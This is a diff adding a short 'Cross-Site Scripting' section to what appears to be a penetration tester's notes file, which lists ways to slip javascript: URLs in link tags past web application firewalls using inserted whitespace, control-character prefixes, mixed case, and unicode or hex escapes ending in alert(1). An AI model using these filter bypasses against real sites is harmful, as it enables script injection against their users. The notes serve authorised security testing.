@@ -1688,3 +1688,33 @@ nuclei -l newsubs.httprobe -c 60 -t /root/tools/BotTemplates/ -o newsubs.httprob
 #https://www.errno.fr/artifactory/Attacking_Artifactory
 
 ```
+
+
+#### Cross-Site Scripting Bit n Bobs
+
+```html
+Got a lot to add here (naturally) but for the time being just noting down this bypass.
+
+If exploiting <a href></a> xss and "javasript" is blocked by WAF or URL then try the below.
+
+Add any number of \n \t or \r in the middle
+java\nscript:
+
+Add characters from \x00- \x20 at the beginning
+
+\x01javascript:
+
+
+Randoomize the case
+
+jaVAscrIpT:
+
+Can also use the below to get rid of the word JavaScript all together
+
+\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
+
+\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
+
+
+
+```
